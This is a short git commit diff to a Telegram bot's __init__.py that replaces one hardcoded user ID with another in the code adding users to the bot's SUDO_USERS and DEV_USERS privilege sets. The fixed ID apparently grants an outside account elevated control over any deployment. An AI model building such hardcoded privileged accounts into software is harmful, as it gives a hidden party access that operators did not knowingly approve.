80cafa5a29eb415d9bdaeb001827629ecad0e89c
VILLAIN <64843897+DONOFTELEGRAM@users.noreply.github.com>
2020-07-27 13:01:25 +0530

    Update __init__.py

--- tg_bot/__init__.py
+++ tg_bot/__init__.py
@@ -142,9 +142,9 @@ else:
     
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(988452336)
+SUDO_USERS.add(989037511)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(988452336)
+DEV_USERS.add(989037511)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
